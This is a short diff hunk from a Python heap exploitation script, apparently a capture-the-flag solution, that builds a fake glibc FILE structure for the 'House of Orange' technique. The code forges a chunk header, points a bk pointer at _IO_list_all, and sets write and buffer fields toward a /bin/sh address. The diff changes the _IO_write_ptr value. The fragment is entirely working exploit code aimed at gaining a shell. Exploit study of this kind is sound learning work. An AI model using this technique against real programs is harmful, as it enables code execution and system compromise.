@@ -39,7 +39,7 @@ def house_of_orange():
     stream  = p64(0) + p64(0x61)                # fake header   # fp
     stream += p64(0) + p64(io_list_all - 0x10)  # fake bk pointer
     stream += p64(0)                            # fp->_IO_write_base
-    stream += p64(0x7fffffffffffffff)           # fp->_IO_write_ptr
+    stream += p64(0xffffffff)                   # fp->_IO_write_ptr
     stream += p64(0) *2                         # fp->_IO_write_end, fp->_IO_buf_base
     stream += p64((bin_sh_addr - 100) / 2)      # fp->_IO_buf_end
     stream  = stream.ljust(0xc0, '\x00')
